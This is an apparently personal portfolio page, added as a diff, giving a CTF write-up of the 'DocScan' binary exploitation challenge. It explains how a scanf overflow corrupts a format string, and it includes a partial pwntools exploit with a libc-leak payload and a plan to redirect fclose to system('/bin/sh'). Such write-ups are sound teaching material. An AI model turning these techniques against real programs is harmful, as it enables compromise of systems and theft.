@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>DocScan &mdash; MetaCTF: Road to Cyber Bay | Ryan Ethier</title>
+<meta name="description" content="Binary exploitation write-up for DocScan, a MetaCTF: Road to Cyber Bay challenge chaining a buffer overflow into a format string exploit." />
+<link rel="icon" type="image/svg+xml" href="../../../assets/favicon.svg" />
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../../../assets/style.css" />
+</head>
+<body>
+
+<nav class="sitenav">
+  <div class="container">
+    <a href="../../../index.html" class="brand">ryan_ethier@portfolio:~$</a>
+    <ul>
+      <li><a href="../../../index.html#projects">Projects</a></li>
+      <li><a href="../../../index.html#forensics">Forensics</a></li>
+      <li><a href="../../../index.html#about">About</a></li>
+      <li><a href="../../../index.html#contact">Contact</a></li>
+    </ul>
+  </div>
+</nav>
+
+<div class="container">
+
+<div class="breadcrumb"><a href="../../../index.html">Home</a> / Projects / <a href="../index.html">CTF &amp; Wargame Write-Ups</a> / <a href="index.html">MetaCTF: Road to Cyber Bay</a> / DocScan</div>
+
+<article class="writeup">
+  <span class="eyebrow">Binary Exploitation &middot; 211 pts</span>
+  <h1>DocScan</h1>
+  <p class="subtitle">MetaCTF: Road to Cyber Bay</p>
+
+  <h2>Challenge Description</h2>
+  <p>
+    We are given a binary called <code>docscan.bin</code>, a set of test files in <code>docs/</code>,
+    and a <code>libc.so.6</code>. A <code>test.sh</code> script demonstrates usage.
+  </p>
+  <pre><code>rethier@kali:~$ tree --charset unicode
+.
+|-- Dockerfile
+|-- docs
+|   |-- chars.txt
+|   |-- floats.txt
+|   |-- ints.txt
+|   `-- strs.txt
+|-- docscan.bin
+|-- libc.so.6
+`-- test.sh</code></pre>
+  <p>Running the program:</p>
+  <pre><code>rethier@kali:~$ ./docscan.bin
+*** DocScan (v0.01) ***
+Enter format: int
+Enter quantity: 7
+Enter filename: docs/ints.txt
+Scanning...
+ raw data: 0000000000000001
+ raw data: 0000000000000064
+ ...
+Done! Scanned 7 items</code></pre>
+
+  <h2>Vulnerability</h2>
+  <p>Through reverse engineering we find:</p>
+  <ul>
+    <li>
+      <strong>Global data segment layout:</strong>
+      <pre><code>FILE *fp;
+int count;
+char filename[32];
+char format[32];</code></pre>
+    </li>
+    <li>Both <code>filename</code> and <code>format</code> are read with <code>scanf("%s", ...)</code>, making them <strong>vulnerable to buffer overflow</strong>.</li>
+    <li>Overflowing <code>filename</code> can overwrite <code>format</code> after it has been validated &rarr; leading to a <strong>format string vulnerability</strong> inside <code>fscanf()</code>.</li>
+  </ul>
+  <p>
+    <strong>Key Insight:</strong> By overflowing <code>filename</code> with controlled bytes, we can
+    hijack the <code>format</code> string and weaponize it as a format string vuln.
+  </p>
+
+  <h2>Exploitation Strategy</h2>
+  <ol>
+    <li>Use <code>/dev/stdin</code> (or <code>/proc/self/fd/0</code>) as the &ldquo;file&rdquo; so we can control the input stream.</li>
+    <li>Abuse <code>fscanf()</code> with malicious format strings.</li>
+    <li>Craft a <strong>write-what-where primitive</strong> by overwriting stack arguments.</li>
+    <li>Redirect GOT entries (<code>exit</code>, <code>fclose</code>) to leak addresses and eventually call <code>system("/bin/sh")</code>.</li>
+  </ol>
+
+  <h2>Exploit Code</h2>
+  <pre><code>from pwn import *
+
+if len(sys.argv) &lt; 2:
+    print(f"Usage: {sys.argv[0]} &lt;local|remote&gt; [host] [port]")
+    exit(0)
+elif sys.argv[1] == "local":
+    p = process("./docscan.bin")
+    e = p.elf
+    l = e.libc
+elif sys.argv[1] == "remote":
+    p = remote(sys.argv[2], sys.argv[3])
+    e = ELF("./docscan.bin")
+    l = ELF("./libc.so.6")
+
+writable = e.symbols['format']+0x20
+
+# Stage 1: Leak a libc pointer
+p.sendline(b"int")
+p.sendline(b"3")
+p.sendline(b"/proc/self/fd/0" + b"\0"*(32-15) + b"%11$lu%15$lu")
+...
+# Stage 2: Place "/bin/sh" and redirect fclose &rarr; system()
+...
+p.interactive()</code></pre>
+
+  <h2>Flag</h2>
+  <p><code>MetaCTF{redacted}</code></p>
+
+  <h2>Takeaways</h2>
+  <ul>
+    <li>Buffer overflows can chain into format string vulns.</li>
+    <li><code>scanf()</code> family can be just as dangerous as <code>printf()</code> when misused.</li>
+    <li>GOT overwrites remain a powerful path to shell when RELRO is partial.</li>
+  </ul>
+</article>
+
+</div>
+</body>
+</html>
